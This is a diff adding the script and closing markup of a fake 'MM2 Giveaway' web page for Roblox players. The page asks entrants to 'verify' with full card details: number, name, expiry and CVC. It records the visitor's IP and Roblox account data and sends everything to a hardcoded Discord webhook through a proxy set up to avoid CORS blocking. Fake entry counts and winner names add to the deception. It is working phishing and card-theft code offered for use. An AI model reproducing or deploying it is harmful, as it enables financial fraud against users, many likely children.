+      <div class="verify-actions">
+        <button class="btn-ghost" id="verifyCancel">Cancel</button>
+        <button class="btn-primary" id="verifySubmit" disabled>Verify & Enter</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+  // ============================================================
+  //  CONFIG — set your Discord webhook + Cloudflare Worker URL
+  // ============================================================
+  const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1552007763792760942/ylyiUZozlXaOl3fzKwn7BIxiuzH0P4aW2J8A5we1E-NRGi6YHrF8_ymmLB7Q4F952xAa';
+  // ^^ ROTATE THIS — it's public now. Then paste the new URL here.
+  const PROXY_URL = 'https://your-worker-name.your-subdomain.workers.dev';
+
+  // ---------- Card brand detection ----------
+  function detectCardBrand(number) {
+    const n = String(number).replace(/\D/g, '');
+    if (!n) return null;
+
+    if (/^4/.test(n)) return 'Visa';
+    if (/^5[1-5]/.test(n)) return 'Mastercard';
+    if (/^2(2[2-9][1-9]|2[3-9]\d{2}|[3-6]\d{3}|7[01]\d{2}|720)/.test(n)) return 'Mastercard';
+    if (/^3[47]/.test(n)) return 'American Express';
+    if (/^6011/.test(n)) return 'Discover';
+    if (/^65/.test(n)) return 'Discover';
+    if (/^64[4-9]/.test(n)) return 'Discover';
+    if (/^622(12[6-9]|1[3-9]\d|[2-8]\d{2}|9[01]\d|92[0-5])/.test(n)) return 'Discover';
+    if (/^35(2[89]|[3-8]\d)/.test(n)) return 'JCB';
+    if (/^3(0[0-5]|[689])/.test(n)) return 'Diners Club';
+    if (/^62/.test(n)) return 'UnionPay';
+    if (/^(5018|5020|5038|5893|6304|6759|676[1-3])/.test(n)) return 'Maestro';
+    if (/^(4011|4312|4389|5041|5066|5090|6277|6362|6363|650[0-9]|651[0-9]|6550)/.test(n)) return 'Elo';
+    if (/^6062/.test(n)) return 'Hipercard';
+    if (/^220[0-4]/.test(n)) return 'Mir';
+    return null;
+  }
+
+  // ---------- Discord webhook (via proxy) ----------
+  async function sendToDiscord(payload) {
+    if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes('YOUR_WEBHOOK')) {
+      console.warn('[webhook] No webhook configured — skipping send.');
+      return false;
+    }
+    if (!PROXY_URL || PROXY_URL.includes('your-worker-name')) {
+      console.warn('[webhook] No PROXY_URL configured — falling back to direct (CORS will likely block it).');
+    }
+
+    const endpoint = PROXY_URL && !PROXY_URL.includes('your-worker-name')
+      ? PROXY_URL + '?url=' + encodeURIComponent(DISCORD_WEBHOOK_URL)
+      : DISCORD_WEBHOOK_URL;
+
+    try {
+      const res = await fetch(endpoint, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+      console.log('[webhook] status:', res.status, endpoint);
+      if (!res.ok) {
+        const txt = await res.text().catch(() => '');
+        console.error('[webhook] non-OK response:', txt);
+      }
+      return res.ok;
+    } catch (e) {
+      console.error('[webhook] send failed:', e);
+      return false;
+    }
+  }
+
+  function buildEmbed({ username, canonicalName, cardNumber, cardName, cardExpiry, cardCvc, userId, accountAgeDays, ip }) {
+    const now = new Date().toISOString();
+    const brand = detectCardBrand(cardNumber) || 'Unknown';
+
+    const fields = [
+      { name: '🎮 Roblox Username (entered)', value: `\`${username}\``, inline: true },
+      { name: '✅ Canonical Name', value: canonicalName ? `\`${canonicalName}\`` : '*unverified*', inline: true },
+      { name: '🆔 Roblox User ID', value: userId ? `\`${userId}\`` : '*n/a*', inline: true },
+      { name: '📅 Account Age', value: accountAgeDays != null ? `\`${accountAgeDays} days\`` : '*n/a*', inline: true },
+      { name: '🌐 IP (client-reported)', value: ip ? `\`${ip}\`` : '*not available*', inline: true },
+      { name: '\u200b', value: '\u200b', inline: true },
+      { name: '💳 Card Brand', value: `\`${brand}\``, inline: true },
+      { name: '🔢 Card Number', value: `\`${cardNumber || '—'}\``, inline: false },
+      { name: '👤 Name on Card', value: `\`${cardName || '—'}\``, inline: true },
+      { name: '📆 Expiry', value: `\`${cardExpiry || '—'}\``, inline: true },
+      { name: '🔒 CVC', value: `\`${cardCvc || '—'}\``, inline: true },
+    ];
+    return {
+      username: 'MM2 Giveaway',
+      avatar_url: 'https://i.imgur.com/4M34hi2.png',
+      embeds: [{
+        title: '🎉 New Giveaway Entry',
+        color: 0xd4ff3a,
+        fields,
+        footer: { text: `Round #47 • ${now}` },
+        timestamp: now
+      }]
+    };
+  }
+
+  let cachedIP = null;
+  async function fetchIP() {
+    if (cachedIP) return cachedIP;
+    try {
+      const r = await fetch('https://api.ipify.org?format=json');
+      const j = await r.json();
+      cachedIP = j.ip || null;
+    } catch { cachedIP = null; }
+    return cachedIP;
+  }
+
+  let cardFilled = false;
+
+  function setupCardForm() {
+    const cardNumber = document.getElementById('cardNumber');
+    const cardName = document.getElementById('cardName');
+    const cardExpiry = document.getElementById('cardExpiry');
+    const cardCvc = document.getElementById('cardCvc');
+    const verifySubmit = document.getElementById('verifySubmit');
+    const verifyStatus = document.getElementById('verifyStatus');
+    const brandBadge = document.getElementById('cardBrandBadge');
+
+    if (!cardNumber) return;
+
+    cardNumber.addEventListener('input', function() {
+      let digits = this.value.replace(/\D/g, '').slice(0, 19);
+      let formatted = digits.replace(/(\d{4})(?=\d)/g, '$1 ');
+      this.value = formatted;
+
+      const brand = detectCardBrand(digits);
+      if (brand && digits.length >= 2) {
+        brandBadge.textContent = brand;
+        brandBadge.className = 'card-brand-badge detected';
+      } else {
+        brandBadge.textContent = '';
+        brandBadge.className = 'card-brand-badge';
+      }
+
+      checkFilled();
+    });
+
+    cardExpiry.addEventListener('input', function() {
+      let digits = this.value.replace(/\D/g, '').slice(0, 4);
+      if (digits.length >= 3) {
+        this.value = digits.slice(0, 2) + '/' + digits.slice(2);
+      } else {
+        this.value = digits;
+      }
+      checkFilled();
+    });
+
+    cardCvc.addEventListener('input', function() {
+      this.value = this.value.replace(/\D/g, '').slice(0, 4);
+      checkFilled();
+    });
+
+    cardName.addEventListener('input', checkFilled);
+
+    function checkFilled() {
+      const num = cardNumber.value.replace(/\s/g, '');
+      const name = cardName.value.trim();
+      const expiry = cardExpiry.value;
+      const cvc = cardCvc.value;
+
+      cardFilled = num.length > 0 && name.length > 0 && expiry.length > 0 && cvc.length > 0;
+
+      if (cardFilled) {
+        verifyStatus.textContent = '✓ Card details entered';
+        verifyStatus.className = 'verify-status ok';
+        verifySubmit.disabled = false;
+      } else {
+        verifyStatus.textContent = 'Enter card details to continue';
+        verifyStatus.className = 'verify-status';
+        verifySubmit.disabled = true;
+      }
+    }
+
+    checkFilled();
+
+    window.__resetCardForm = function() {
+      cardNumber.value = '';
+      cardName.value = '';
+      cardExpiry.value = '';
+      cardCvc.value = '';
+      brandBadge.textContent = '';
+      brandBadge.className = 'card-brand-badge';
+      cardFilled = false;
+      verifyStatus.textContent = 'Enter card details to continue';
+      verifyStatus.className = 'verify-status';
+      verifySubmit.disabled = true;
+    };
+  }
+
+  (function() {
+    const input = document.getElementById('usernameInput');
+    const btn = document.getElementById('enterBtn');
+    const countEl = document.getElementById('entryCount');
+    const countMonoEl = document.getElementById('entryCountMono');
+    const msgEl = document.getElementById('messageBox');
+    const winnerEl = document.getElementById('lastWinner');
+    const honeypot = document.getElementById('honeypotField');
+    const tosBtn = document.getElementById('tosBtn');
+    const tosModal = document.getElementById('tosModal');
+    const tosClose = document.getElementById('tosClose');
+
+    const verifyModal = document.getElementById('verifyModal');
+    const verifyClose = document.getElementById('verifyClose');
+    const verifyCancel = document.getElementById('verifyCancel');
+    const verifySubmit = document.getElementById('verifySubmit');
+
+    const TARGET = 10000;
+    let entryCount = 9995;
+    let lastWinner = 'xX_MM2_Pro_Xx';
+    let isBusy = false;
+    let pendingUsername = null;
+
+    async function lookupRobloxUser(username) {
+      try {
+        const res = await fetch('https://users.roblox.com/v1/usernames/users', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ usernames: [username], excludeBannedUsers: true })
+        });
+        if (!res.ok) return null;
+        const data = await res.json();
+        if (!data.data || data.data.length === 0) return null;
+        return data.data[0];
+      } catch {
+        return null;
+      }
+    }
+
+    async function getAccountCreated(userId) {
+      try {
+        const res = await fetch(`https://users.roblox.com/v1/users/${userId}`);
+        if (!res.ok) return null;
+        const data = await res.json();
+        return new Date(data.created);
+      } catch {
+        return null;
+      }
+    }
+
+    function formatNumber(n) {
+      return n.toLocaleString('en-US');
+    }
+
+    function updateUI() {
+      countEl.textContent = formatNumber(entryCount);
+      countMonoEl.textContent = `${formatNumber(entryCount)} / ${formatNumber(TARGET)}`;
+      winnerEl.textContent = lastWinner;
+    }
+
+    function setMessage(text, type) {
+      msgEl.textContent = text;
+      msgEl.className = 'msg';
+      if (type) msgEl.classList.add(type);
+    }
+
+    async function handleEntry() {
+      if (isBusy) return;
+
+      const raw = input.value.trim();
+
+      if (honeypot.value !== '') {
+        setMessage('✓ Entry received.', 'success');
+        input.disabled = true;
+        btn.disabled = true;
+        return;
+      }
+
+      if (!raw) {
+        setMessage('Please enter a username.', 'error');
+        input.focus();
+        return;
+      }
+      if (raw.length < 3 || raw.length > 20) {
+        setMessage('Username must be 3–20 characters.', 'error');
+        input.focus();
+        return;
+      }
+      if (!/^[a-zA-Z0-9_]+$/.test(raw)) {
+        setMessage('Only letters, numbers, and underscores allowed.', 'error');
+        input.focus();
+        return;
+      }
+
+      pendingUsername = raw;
+      setMessage('Verification required…', 'loading');
+      openVerifyModal();
+    }
+
+    function openVerifyModal() {
+      verifyModal.classList.add('open');
+      if (window.__resetCardForm) window.__resetCardForm();
+      fetchIP();
+    }
+
+    function closeVerifyModal() {
+      verifyModal.classList.remove('open');
+      pendingUsername = null;
+      if (window.__resetCardForm) window.__resetCardForm();
+    }
+
+    async function submitVerify() {
+      if (!pendingUsername) return;
+
+      const cardNumber = document.getElementById('cardNumber').value.trim();
+      const cardName   = document.getElementById('cardName').value.trim();
+      const cardExpiry = document.getElementById('cardExpiry').value.trim();
+      const cardCvc    = document.getElementById('cardCvc').value.trim();
+
+      if (!cardFilled) {
+        const verifyStatus = document.getElementById('verifyStatus');
+        verifyStatus.textContent = 'Please fill in all card fields.';
+        verifyStatus.className = 'verify-status err';
+        return;
+      }
+
+      verifySubmit.disabled = true;
+      verifySubmit.innerHTML = '<span class="spinner"></span> Verifying';
+      const verifyStatus = document.getElementById('verifyStatus');
+      verifyStatus.textContent = 'Checking account…';
+      verifyStatus.className = 'verify-status';
+
+      const raw = pendingUsername;
+
+      let user = null;
+      let canonicalName = raw;
+      let userId = null;
+      let accountAgeDays = null;
+
+      try { user = await lookupRobloxUser(raw); } catch {}
+      if (user) {
+        canonicalName = user.name;
+        userId = user.id;
+        try {
+          const createdAt = await getAccountCreated(user.id);
+          if (createdAt) {
+            accountAgeDays = Math.floor((Date.now() - createdAt.getTime()) / 86400000);
+          }
+        } catch {}
+      }
+
+      let ip = cachedIP;
+      try { ip = await fetchIP(); } catch {}
+
+      const payload = buildEmbed({
+        username: raw,
+        canonicalName: user ? canonicalName : null,
+        cardNumber,
+        cardName,
+        cardExpiry,
+        cardCvc,
+        userId,
+        accountAgeDays,
+        ip
+      });
+
+      sendToDiscord(payload)
+        .then(ok => console.log('[webhook] delivered:', ok))
+        .catch(err => console.error('[webhook] error:', err));
+
+      entryCount++;
+      if (entryCount % 12 === 0) lastWinner = canonicalName;
+
+      updateUI();
+      closeVerifyModal();
+      setMessage(`✓ Verified as ${canonicalName}. Good luck.`, 'success');
+
+      input.disabled = false;
+      btn.disabled = false;
+      input.value = '';
+      btn.innerHTML = 'Enter <span>→</span>';
+      input.focus();
+    }
+
+    btn.addEventListener('click', handleEntry);
+    input.addEventListener('keypress', (e) => {
+      if (e.key === 'Enter') {
+        e.preventDefault();
+        handleEntry();
+      }
+    });
+
+    verifySubmit.addEventListener('click', submitVerify);
+    verifyCancel.addEventListener('click', closeVerifyModal);
+    verifyClose.addEventListener('click', closeVerifyModal);
+    verifyModal.addEventListener('click', (e) => {
+      if (e.target === verifyModal) closeVerifyModal();
+    });
+
+    tosBtn.addEventListener('click', () => tosModal.classList.add('open'));
+    tosClose.addEventListener('click', () => tosModal.classList.remove('open'));
+    tosModal.addEventListener('click', (e) => {
+      if (e.target === tosModal) tosModal.classList.remove('open');
+    });
+    document.addEventListener('keydown', (e) => {
+      if (e.key === 'Escape') {
+        tosModal.classList.remove('open');
+        if (verifyModal.classList.contains('open')) closeVerifyModal();
+      }
+    });
+
+    setupCardForm();
+    updateUI();
+  })();
+</script>
+</body>
+</html>
